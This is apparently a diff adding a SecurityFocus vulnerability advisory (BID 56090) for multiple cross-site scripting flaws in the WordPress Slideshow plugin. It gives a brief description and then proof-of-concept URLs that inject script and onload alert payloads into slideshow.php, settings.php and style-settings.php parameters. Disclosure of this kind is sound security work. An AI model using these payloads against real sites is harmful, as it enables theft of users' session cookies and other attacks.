@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/56090/info
+
+The Slideshow plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=";><script>alert(123);</script>
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?slides[0][type]=text&slides[0][title]=<script>alert(123);</script>
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?settings=<body+onload='alert(123)'>
+
+
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings[][group]=<script>alert(123);</script>
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings
+
+
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0][3]=<script>alert(123);</script>
+http://www.example.com/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0]&inputFields[0]=<script>alert(123);</script>
+
